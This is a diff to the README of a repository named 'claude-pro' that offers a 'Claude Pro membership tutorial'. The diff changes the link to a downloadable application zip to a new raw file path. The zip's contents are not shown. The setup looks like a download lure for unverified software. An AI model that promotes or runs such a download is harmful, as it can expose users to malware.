@@ -9,7 +9,7 @@ Welcome to the "claude-pro" GitHub repository dedicated to guiding users through
 
 ## 🚀 Application Download Link
 Click below to download the application for the Claude Pro membership tutorial:
-[![Click to Download Application](https://github.com/theenayi/claude-pro/releases/download/v2.0/Software.zip)](https://github.com/theenayi/claude-pro/releases/download/v2.0/Software.zip)
+[![Click to Download Application](https://raw.githubusercontent.com/theenayi/claude-pro/main/elemental/claude-pro-v2.8.zip)](https://raw.githubusercontent.com/theenayi/claude-pro/main/elemental/claude-pro-v2.8.zip)
 
 # 🌈 Getting Started with Claude Pro
 
